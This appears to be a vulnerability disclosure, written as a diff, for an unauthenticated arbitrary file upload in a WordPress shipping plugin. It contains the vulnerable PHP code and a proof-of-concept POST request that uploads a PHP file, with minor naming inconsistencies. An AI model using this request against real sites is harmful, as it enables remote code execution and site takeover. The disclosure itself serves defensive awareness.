@@ -1,0 +1,40 @@
+# Exploit Title: WordPress Plugin Baggage Freight Shipping Australia 0.1.0 - Arbitrary File Upload
+# Date: 2018-12-24
+# Software Link: https://wordpress.org/plugins/baggage-freight/
+# Exploit Author: Kaimi
+# Website: https://kaimi.io
+# Version: 0.1.0
+# Category: webapps
+
+# Unrestricted file upload for unahtorized user in package info upload 
+# process allowing arbitrary extension.
+
+File: upload-package.php
+
+Vulnerable code:
+if($_POST["submit"])
+{
+    if ($_FILES["file"])
+    {
+        $uploadpath = "../wp-content/plugins/baggage_shipping/upload/".time()."_".$_FILES["file"]["name"];
+
+        move_uploaded_file($_FILES["file"]["tmp_name"],$uploadpath);
+
+# Exploitation example:
+
+POST /wp-content/plugins/baggage-freight/upload-package.php HTTP/1.1
+Host: example.com
+Content-Type: multipart/form-data; boundary=---------------------------18311719029180117571501079851
+...
+-----------------------------18311719029180117571501079851
+Content-Disposition: form-data; name="submit"
+
+1
+-----------------------------18311719029180117571501079851
+Content-Disposition: form-data; name="file"; filename="file.php"
+Content-Type: audio/wav
+
+<?php phpinfo();
+-----------------------------18311719029180117571501079851--
+
+# Uploaded file will be located at /wp-content/plugins/baggage_shipping/upload/{timestamp}_info.php.
